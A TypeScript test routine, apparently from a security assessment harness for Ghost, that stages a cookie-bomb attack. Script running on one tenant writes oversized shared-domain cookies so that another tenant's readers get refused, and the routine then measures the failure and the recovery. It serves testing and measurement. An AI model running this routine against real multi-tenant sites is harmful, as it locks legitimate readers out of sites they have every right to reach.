// Cookie bomb: the attacker writes enough cookie bytes for the shared domain
// that the victim tenant's next request carries a header Ghost refuses, so the
// victim's readers cannot load the site until the cookies expire.
//
// The verdict is the real route (the attacker's vectors on tenant B, then one
// request to tenant A). The residual is the single oversize-cookie request the
// plan allows as a measurement: with script assumed to be running on B, it
// writes the bomb once, makes one request to A to read the limit, clears the
// cookies, and makes one more to show A recovers. Never repeated.

import { cookieBytes, jarFor, mergeMarks, signedInVictim, visit } from '../browser.ts';
import type { BombObservation, BombResidual } from '../observations.ts';
import { bombNames, bombScript } from '../payloads.ts';
import type { World } from '../world.ts';

export async function attackCookieBomb(world: World): Promise<BombObservation> {
  const context = await signedInVictim(
    world.browser,
    world.a.host,
    world.a.admin.session,
    world.a.secure
  );
  try {
    await visit(context, `${world.a.origin}/`);
    const marks: Record<string, boolean> = {};
    let pagesVisited = 0;
    for (const url of [`${world.b.origin}/`, `${world.b.origin}${world.planted.inlinePostPath}`]) {
      mergeMarks(marks, (await visit(context, url)).marks);
      pagesVisited += 1;
    }
    const after = await visit(context, `${world.a.origin}/`, 200);
    const names = bombNames();
    const bombJar = (await jarFor(context, `${world.a.origin}/`)).filter((c) =>
      names.includes(c.name)
    );
    const bombBytesInVictimJar = cookieBytes(bombJar);
    // Whatever the real route wrote must not colour the measurement below.
    await context.clearCookies({ name: /^bomb/ });

    const page = await context.newPage();
    await page.goto(`${world.b.origin}/`, { waitUntil: 'load', timeout: 30_000 });
    await page.evaluate(`(function(){${bombScript(world.attacker)}})()`);
    await page.close();
    const written = (await jarFor(context, `${world.a.origin}/`)).filter((c) =>
      names.includes(c.name)
    );
    const withBomb = await visit(context, `${world.a.origin}/`, 200);
    await context.clearCookies({ name: /^bomb/ });
    const recovered = await visit(context, `${world.a.origin}/`, 200);
    const residual: BombResidual = {
      cookieBytes: cookieBytes(written),
      statusWithBomb: withBomb.status,
      statusAfterClear: recovered.status,
      sharedDomainWriteAccepted: written.length > 0,
    };

    return {
      pagesVisited,
      scriptRan: marks['bomb'] === true,
      victimStatus: after.status,
      bombBytesInVictimJar,
      residual,
      psl: world.psl,
    };
  } finally {
    await context.close();
  }
}
